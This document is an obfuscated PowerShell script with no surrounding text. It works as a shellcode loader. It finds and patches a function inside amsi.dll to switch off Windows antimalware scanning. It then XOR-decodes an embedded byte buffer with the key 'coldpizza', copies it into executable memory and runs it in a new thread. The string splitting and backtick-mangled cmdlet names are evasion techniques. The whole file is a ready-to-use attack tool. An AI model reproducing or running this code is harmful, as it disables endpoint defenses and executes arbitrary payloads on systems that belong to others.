Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    w`hERe-O`Bj`eCt { $_.GlobalAssemblyCache -And $_.Location.Split((('jf'+'2j'+'f2').REPlaCe('jf2','\')))[-1].Equals(('Sys'+'tem'+'.dll')) }
    $UnsafeNativeMethods = $SystemAssembly.GetType(('Microso'+'f'+'t.Win3'+'2.UnsafeNativeMet'+'h'+'o'+'d'+'s'))
    
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(('GetMo'+'dule'+'Ha'+'ndle'))
    $GetProcAddress = $UnsafeNativeMethods.GetMethod(('Ge'+'tP'+'r'+'ocAddr'+'ess'), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = N`E`w-ObJECt IntPtr
    $HandleRef = NE`W-o`BjEcT System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (Ne`w-`OBj`eCt Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = N`EW`-`OBject System.Reflection.AssemblyName(('Re'+'flectedD'+'e'+'lega'+'te'))
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(('InMemo'+'ryMod'+'ul'+'e'), $false)
    $TypeBuilder = $ModuleBuilder.DefineType(('MyDel'+'ega'+'teTy'+'pe'), ('Clas'+'s, Publi'+'c'+', Sealed, An'+'s'+'i'+'Class, '+'AutoClass'), [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor(('R'+'TS'+'pecia'+'l'+'Name, '+'H'+'ideBySig'+', Pub'+'lic'), [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags(('Runti'+'me, '+'Mana'+'ged'))
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', ('Public, '+'HideBySig'+', New'+'Slo'+'t, Virt'+'ua'+'l'), $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags(('Ru'+'ntim'+'e,'+' Managed'))
        
    WrITe`-o`UT`Put $TypeBuilder.CreateType()
}
$LoadLibraryAddr = get-pro`cA`d`dr`esS kernel32.dll LoadLibraryA
$LoadLibraryDelegate = G`et`-DELegAT`etYPE @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
$GetProcAddressAddr = GEt`-p`ROC`ADdRe`ss kernel32.dll GetProcAddress
$GetProcAddressDelegate = gET`-D`ElE`gAtetYpE @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
$VirtualProtectAddr = g`e`T-prOc`AdDRe`sS kernel32.dll VirtualProtect
$VistualProtectDelegate =  g`e`T-dE`Le`GAteTypE @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)


If ([IntPtr]::Size -eq 8) {
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       
        0x49, 0x89, 0x5B, 0x08, 
        0x49, 0x89, 0x6B, 0x10, 
        0x49, 0x89, 0x73, 0x18, 
        0x57,                   
        0x41, 0x56,             
        0x41, 0x57,             
        0x48, 0x83, 0xEC, 0x70  
    )
} Else {
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             
        0x55,                   
        0x8B, 0xEC,             
        0x83, 0xEC, 0x18,       
        0x53,                   
        0x56                    
    )
}


$hModule = $LoadLibrary.Invoke(('am'+'si.dll'))
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, ('Dll'+'Ge'+'tCla'+'ssObject'))
[IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)

$oldProtectionBuffer = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | OU`T-`NULl

$patch = [byte[]] (
    0x31, 0xC0,    
    0xC3           
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | O`UT-nu`Ll


function LookupFunc {

        Param ($moduleName, $functionName)

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split((('dtU'+'dtU').replACe(([cHAR]100+[cHAR]116+[cHAR]85),'\')))[-1].
      Equals(('Sys'+'tem'+'.dll')) }).GetType(('M'+'icro'+'soft.Win32.'+'Unsa'+'f'+'eNativeM'+'etho'+'ds'))
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq ('Ge'+'tP'+'r'+'ocAddres'+'s')) {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod(('Ge'+'tModu'+'leHa'+'ndle'))).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
                [Parameter(Position = 1)] [Type] $delType = [Void]
        )

        $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(('R'+'eflectedDe'+'legat'+'e'))), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule(('I'+'nMemor'+'yModul'+'e'), $false).
      DefineType(('MyDelegat'+'e'+'T'+'yp'+'e'), ('Class, Public,'+' S'+'e'+'aled, '+'An'+'siC'+'la'+'ss, A'+'uto'+'Cl'+'ass'), 
      [System.MulticastDelegate])

  $type.
    DefineConstructor(('RTS'+'pecialNa'+'me, HideB'+'y'+'Sig, P'+'ublic'), [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags(('R'+'u'+'n'+'time, '+'Managed'))

  $type.
    DefineMethod('Invoke', ('Public,'+' H'+'ideByS'+'ig'+', New'+'Sl'+'ot'+','+' Virtual'), $delType, $func).
      SetImplementationFlags(('Runtim'+'e'+', Manag'+'ed'))

        return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

$key = ('col'+'d'+'pizza')

[Byte[]] $buf = 0x9f,0x87,0xe3,0x64,0x70,0x69,0x1a,0x4b,0xb3,0xea,0x8a,0x8,0xef,0x22,0x59,0xf1,0x28,0x6d,0xe8,0x3d,0x78,0xef,0x2,0x41,0x75,0xcd,0x2b,0x45,0x5e,0x93,0x55,0xb0,0xc5,0x46,0x1b,0x1d,0x61,0x43,0x4c,0xa5,0xbf,0x64,0x7b,0xbd,0x28,0x16,0x80,0x3e,0xef,0x22,0x79,0x2d,0xf1,0x23,0x5f,0x6e,0xbc,0xef,0x30,0x11,0xff,0xba,0x15,0x2f,0x6e,0xbc,0xef,0x38,0x71,0x2a,0xf1,0x39,0x43,0x6e,0xbf,0xe1,0xb9,0x1d,0x46,0x33,0x50,0x9c,0xe4,0x58,0xef,0x71,0xbf,0x4b,0xba,0xcd,0xa2,0xa0,0x61,0x65,0xb7,0x51,0x9a,0xf,0x95,0x60,0x12,0x94,0x5f,0xd,0x4d,0xf,0x9a,0x39,0xe8,0x37,0x48,0x65,0xa3,0xf,0xf1,0x76,0x2a,0xe8,0x37,0x70,0x65,0xa3,0xe2,0x7e,0xf1,0x60,0xb3,0xe6,0x28,0x40,0x54,0x32,0x21,0x1b,0x38,0x39,0x3e,0x93,0x84,0x28,0x36,0x20,0xf1,0x73,0x8a,0xef,0x93,0x9b,0x8f,0x34,0x12,0x14,0x4,0x17,0x6f,0x4,0x13,0x19,0x7,0x13,0x2e,0x9,0x2f,0x18,0x4a,0x63,0x8f,0xbc,0x4b,0xa1,0x32,0x30,0x3c,0x3f,0x37,0x98,0x11,0x7a,0x7a,0x61,0x2e,0x0,0x16,0xd,0x1c,0x5,0x1b,0x55,0x54,0x4d,0x5f,0x4c,0x4c,0x3d,0x8,0x19,0x13,0xf,0x17,0x0,0x1f,0xc,0x4b,0x49,0x33,0x14,0x15,0x6,0x3,0x4c,0x29,0x11,0xa,0x5a,0x35,0x32,0x43,0x37,0x4c,0x55,0x42,0x36,0x48,0x25,0x50,0x4a,0x4f,0x2d,0x14,0x0,0x5,0x1f,0x2d,0x4,0x1,0x24,0x5,0x10,0x5f,0x5c,0x49,0x4d,0x4f,0x50,0x59,0x4c,0x4c,0x3b,0x21,0x2e,0x37,0x2d,0x4f,0x4f,0x0,0xd,0x1b,0xc,0x5a,0x3d,0x4,0x0,0x4,0x3,0x4d,0x50,0x2a,0x12,0x8,0xe,0xe,0xa,0x43,0x5d,0x48,0x47,0x4a,0x54,0x55,0x54,0x5a,0x54,0x4a,0x48,0x58,0x5a,0x29,0x0,0x5,0xe,0x1e,0xd,0x5f,0x5c,0x49,0x4d,0x4f,0x50,0x59,0x6c,0xc,0x4a,0x3f,0x3,0xdd,0x9e,0xb6,0x3c,0x3f,0xe,0x73,0x3a,0x29,0x12,0xda,0x62,0x6f,0x6c,0x8c,0x2e,0x68,0x7a,0x7a,0x4e,0x4e,0x1d,0x7,0x2d,0x24,0x10,0x32,0x30,0x50,0x53,0x3b,0x35,0x32,0x4,0x5,0x22,0xf,0xe,0x2b,0x2b,0x2f,0x13,0x6,0x58,0x3e,0x25,0x2b,0x2b,0x2a,0x9,0x34,0x36,0x3d,0x48,0x20,0x31,0x6,0x5c,0x3,0x53,0x6,0x4,0x2a,0x1e,0xf,0x33,0x19,0x26,0x2e,0x46,0x1,0x25,0x4d,0x51,0x14,0x5d,0x34,0x0,0x26,0xd,0x2a,0x4d,0x4,0xc,0x2a,0x1,0xe,0x27,0x4,0x8,0x1b,0x57,0x7,0x27,0x1f,0x3b,0x1e,0x6,0x2b,0x16,0x53,0x8,0x5e,0x3c,0x28,0x42,0x3b,0xf,0x4d,0x55,0x27,0x5,0x27,0x17,0x11,0x2c,0x4d,0x20,0x26,0x17,0x25,0x5b,0x16,0x27,0x2,0x33,0x42,0x34,0x8,0x3d,0x2e,0x28,0x34,0x5c,0x31,0xf,0x33,0x2e,0x18,0x1e,0x26,0x3e,0x5d,0x42,0xc,0x27,0x56,0x26,0x3,0xd,0x1c,0x38,0x19,0x4a,0x38,0xb,0x17,0x54,0x32,0x3b,0x5f,0x4f,0x12,0xd,0x57,0x25,0x2d,0x25,0x20,0x1c,0x16,0x3e,0x51,0x12,0x25,0x5,0x57,0x33,0xe,0x31,0x9,0x13,0x5,0x42,0xd,0x5c,0x3c,0x13,0x1b,0x23,0x14,0x2b,0x1c,0x2e,0x34,0x3b,0xf,0x9,0x36,0x2e,0x2d,0x26,0x27,0x52,0x40,0x20,0x2b,0x2a,0x59,0x28,0xc,0x3f,0x1,0x17,0x2e,0x43,0x2f,0x9,0x54,0x16,0x18,0x52,0x29,0x26,0x4b,0x7a,0x31,0xb,0x38,0xe5,0xfb,0xb6,0x96,0xaf,0xf3,0xa7,0x30,0x7,0x6c,0x56,0x98,0xed,0x29,0x29,0x32,0x34,0x3c,0x3a,0xc,0x9b,0x3c,0x54,0x41,0x9e,0xb6,0xf9,0x6,0x6e,0x2f,0x1,0xfa,0x49,0x61,0x63,0xe6,0x8c,0xe,0x74,0x39,0x10,0x65,0x37,0xb,0x1a,0x2a,0xfa,0xf6,0x96,0xaf,0x29,0x32,0x30,0x3c,0x3a,0xc,0x5d,0x6f,0x62,0x1,0x9e,0xb6,0xea,0xac,0x11,0x64,0x1,0xf2,0x69,0x61,0x63,0x7,0x28,0x94,0x45,0x89,0x85,0xaf,0x2e,0x16,0xa2,0x84,0x2e,0x70,0x69,0x7a,0x10,0x21,0xb,0x6f,0x7c,0x64,0x70,0x1,0x7a,0x7a,0x21,0x63,0x3c,0x4,0x3c,0xd4,0x3a,0x9f,0x85,0xb4,0xf0,0x3c,0x3f,0xed,0x97,0x3e,0x12,0x7a,0x41,0x63,0x6f,0x3f,0x32,0x18,0x7b,0xec,0xf3,0x83,0x9c,0xba,0xe9,0xa4,0x4,0xa6,0xf1,0x7d,0x60,0xa0,0xea,0xac,0x11,0x95,0x31,0xb9,0x25,0x89,0x8,0x90,0x93,0x9b,0x41,0x50,0x48,0x54,0x50,0x55,0x57,0x42,0x50,0x49,0x47,0x4c,0x4d,0x61,0xd8,0x9f,0xd9,0xc6,0x26,0x3,0x7a,0x29,0x9e,0xb6

for ($i = 0; $i -lt $buf.length; $i++)
{
    $buf[$i] = [Byte]($buf[$i] -bxor $key[$i % $key.length]);
}

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)



